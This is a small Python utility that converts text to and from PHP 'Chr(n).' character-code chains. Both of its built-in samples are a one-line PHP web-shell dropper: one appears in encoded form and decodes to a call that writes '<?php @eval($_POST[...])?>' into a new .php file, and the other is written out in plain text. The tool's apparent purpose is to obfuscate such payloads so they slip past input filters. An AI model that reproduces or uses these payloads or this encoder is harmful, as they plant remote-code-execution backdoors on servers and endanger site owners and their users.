import re
# ASCII = ord(Word)
# Word = chr(ASCII)

# ASCII -> Word
def ASCII2word(ASCIIs):
	for c in re.findall(r"(\d+)", ASCIIs):
	    print(chr(int(c)),end="")

# Word -> ASCII
def word2ASCII(words):
	ASCIIs = ""
	for word in words:
		ASCIIs += "Chr(" + str(ord(word)) + ")."
	print(ASCIIs)

print("----------ASCII TO WORD---------------------")

asciis = "Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)"
ASCII2word(asciis)

print("\n\n----------WORD TO ASCII--------------------")

words = "fputs(fopen('x.php','w'),'<?php @eval($_POST[pwd])?>');"
word2ASCII(words)